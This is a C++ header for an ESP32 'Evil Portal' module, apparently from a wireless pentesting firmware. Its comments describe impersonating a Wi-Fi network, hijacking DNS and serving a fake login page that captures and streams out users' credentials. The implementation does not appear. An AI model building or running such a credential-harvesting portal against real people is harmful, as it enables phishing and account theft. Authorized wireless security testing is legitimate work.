#pragma once
// FireGod-ESP — Evil Portal (captive portal credential harvester).
// Reconfigures the SoftAP to an OPEN network named `ssid`, runs a DNS
// hijack (all names -> 192.168.4.1) and serves a captive login page.
// Submitted credentials are streamed as {"event":"creds",...} and echoed
// to serial. On stop the original ESP32-Shell AP is restored.
// Authorized testing only.
#include <Arduino.h>

// Shared with web_server.cpp captive routes; true only while portal runs.
extern volatile bool g_portalActive;

// The captive page HTML (served by web_server.cpp catch-all when active).
const char* fg_portal_html();

// The SSID currently being impersonated (for the page title); "" if none.
const char* fg_portal_ssid();

// Module entry.
void fg_evil_portal(const char* ssid, uint8_t channel);
